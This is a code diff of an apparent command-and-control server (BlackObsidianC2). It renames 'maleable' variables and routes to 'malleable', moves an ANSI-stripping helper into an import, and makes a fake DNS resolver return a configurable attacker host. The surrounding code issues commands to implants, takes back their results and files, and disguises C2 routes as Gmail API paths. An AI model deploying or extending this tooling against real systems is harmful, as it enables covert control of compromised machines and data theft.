@@ -1161,9 +1161,7 @@ def escape_js_string(value):
         value = re.sub(r'\r', r'\\r', value)
     return value
 
-def strip_ansi(s):
-    ansi_regex = re.compile(r'[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]')
-    return ansi_regex.sub('', s)
+from core.parsers import strip_ansi
 
 def check_auth(username: str, password: str) -> bool:
     """Verify credentials. Checks RBACStore first, falls back to CLI creds."""
@@ -1524,6 +1522,7 @@ class CustomDNSResolver(BaseResolver):
         reply = request.reply()
         qname = str(request.q.qname)
         qtype = request.q.qtype
+        lhost = getattr(config, "lhost", "127.0.0.1")
 
 
         logger.info(f"Consulta recibida: {qname} (Tipo: {QTYPE[qtype]})")
@@ -1534,15 +1533,15 @@ class CustomDNSResolver(BaseResolver):
 
         subdomain_responses = {
             "info.esporalibre.cl.": {
-                QTYPE.A: A("192.168.1.98"),
+                QTYPE.A: A(lhost),
                 QTYPE.TXT: TXT("Información sobre esporalibre.cl")
             },
             "mail.esporalibre.cl.": {
-                QTYPE.A: A("192.168.1.98"),
+                QTYPE.A: A(lhost),
                 QTYPE.MX: MX("mail.esporalibre.cl.")
             },
             "www.esporalibre.cl.": {
-                QTYPE.A: A("192.168.1.98"),
+                QTYPE.A: A(lhost),
                 QTYPE.CNAME: CNAME("esporalibre.cl.")
             },
             "ns.esporalibre.cl.": {
@@ -2387,9 +2386,9 @@ if not os.path.exists(UPLOAD_FOLDER):
 
 api_key = config.api_key
 
-route_maleable = config.c2_maleable_route
-win_useragent_maleable = config.user_agent_win
-lin_useragent_maleable = config.user_agent_lin
+route_malleable = config.c2_malleable_route
+win_useragent_malleable = config.user_agent_win
+lin_useragent_malleable = config.user_agent_lin
 rhost = config.rhost
 lhost = config.lhost
 
@@ -2499,9 +2498,9 @@ if not api_key:
     shell.onecmd('BlackObsidianC2')
     exit(1)
 
-if not route_maleable:
-    logging.error("Error: c2_maleable_route not found on payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
-    logging.error("Error: c2_maleable_route not found on payload.json")
+if not route_malleable:
+    logging.error("Error: c2_malleable_route not found on payload.json add, Ex:\"c2_malleable_route\": \"/gmail/v1/users/\",")
+    logging.error("Error: c2_malleable_route not found on payload.json")
     sys.exit(1)
 
 if not os.path.exists(atomic_framework_path):
@@ -2706,9 +2705,9 @@ def index():
         user=user,
         username=USERNAME,
         password=PASSWORD,
-        c2_route=route_maleable,
-        win_useragent=win_useragent_maleable,
-        lin_useragent=lin_useragent_maleable,
+        c2_route=route_malleable,
+        win_useragent=win_useragent_malleable,
+        lin_useragent=lin_useragent_malleable,
         implants=implants,
         directories=directories,
         tasks=tasks,
@@ -2730,7 +2729,7 @@ def index():
     )
 
 @app.route('/command/<client_id>', methods=['GET'])
-@app.route(f'{route_maleable}<client_id>', methods=['GET'])
+@app.route(f'{route_malleable}<client_id>', methods=['GET'])
 def send_command(client_id):
     connected_clients.add(client_id)
     if client_id in commands:
@@ -2743,7 +2742,7 @@ def send_command(client_id):
         return Response(encrypted_response, mimetype='application/octet-stream')
 
 @app.route('/command/<client_id>', methods=['POST'])
-@app.route(f'{route_maleable}<client_id>', methods=['POST'])
+@app.route(f'{route_malleable}<client_id>', methods=['POST'])
 def receive_result(client_id):
     # HMAC validation (optional — validates if X-Signature header is present)
     _sig_header = request.headers.get('X-Signature', '')
@@ -3042,7 +3041,7 @@ def issue_command():
     return redirect(url_for('index'))
 
 @app.route('/upload', methods=['GET', 'POST'])
-@app.route(f'{route_maleable}/upload', methods=['GET', 'POST'])
+@app.route(f'{route_malleable}/upload', methods=['GET', 'POST'])
 def upload():
     if request.method == 'POST':
 
@@ -3086,7 +3085,7 @@ def upload():
     '''
 
 @app.route('/download_file', methods=['POST'])
-@app.route(f'{route_maleable}download_file', methods=['POST'])
+@app.route(f'{route_malleable}download_file', methods=['POST'])
 def download_file():
     client_id = request.form['client_id']
     file = request.files['file']
@@ -3114,7 +3113,7 @@ _DOWNLOAD_SAFE_SERVICE = _SafeFileService(
 
 
 @app.route('/download/<path:file_path>', methods=['GET'])
-@app.route(f'{route_maleable}download/<path:file_path>', methods=['GET'])
+@app.route(f'{route_malleable}download/<path:file_path>', methods=['GET'])
 def serve_file(file_path):
     """Serve a file from ``sessions/temp_uploads`` through :class:`SafeFileService`.
 
@@ -3539,9 +3538,9 @@ def api_data():
         'user': user,
         'username': USERNAME,
         'password': PASSWORD,
-        'c2_route': route_maleable,
-        'win_useragent': win_useragent_maleable,
-        'lin_useragent': lin_useragent_maleable,
+        'c2_route': route_malleable,
+        'win_useragent': win_useragent_malleable,
+        'lin_useragent': lin_useragent_malleable,
         'implants': implants,
         'directories': directories,
         'tasks': tasks,
